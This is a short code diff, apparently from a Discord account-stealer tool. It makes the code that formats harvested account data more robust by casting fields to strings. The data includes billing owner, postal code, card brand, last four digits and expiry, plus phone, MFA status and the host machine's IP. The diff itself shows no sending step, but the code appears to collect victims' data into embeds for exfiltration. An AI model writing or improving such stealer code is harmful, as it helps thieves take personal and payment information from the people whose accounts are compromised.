@@ -126,14 +126,14 @@ class Account():
         for bill in self.billing_data:
             billing_info.append(
                 f"Id: {str(bill.get('id'))}\n"
-                f"Owner: {bill.get('billing_address').get('name').title()}\n"
-                f"Postal Code: {bill.get('billing_address').get('postal_code')}\n"
+                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
+                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
                 f"Invalid: {str(bill.get('invalid'))}\n"
-                f"Brand: {bill.get('brand').capitalize()}\n"
-                f"Last digits: {bill.get('last_4')}\n"
+                f"Brand: {str(bill.get('brand')).capitalize()}\n"
+                f"Last digits: {str(bill.get('last_4'))}\n"
                 f"Expires: {str(bill.get('expires_month'))}"
                 f"/{str(bill.get('expires_year'))}\n"
-                f"Country: {bill.get('country')}"
+                f"Country: {str(bill.get('country'))}"
                 )
         return billing_info
 
@@ -154,7 +154,7 @@ def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
             f'Phone: {account.phone}\n'
             f"Nitro: {'Enabled' if account.nitro else 'Disabled'}\n"
             f"MFA: {'Enabled' if account.mfa else 'Disabled'}\n"
-            f"Lang: {account.locale.capitalize()}"
+            f"Lang: {str(account.locale).capitalize()}"
             )
         pc_info = (
             f'IP: {host.ip}\n'
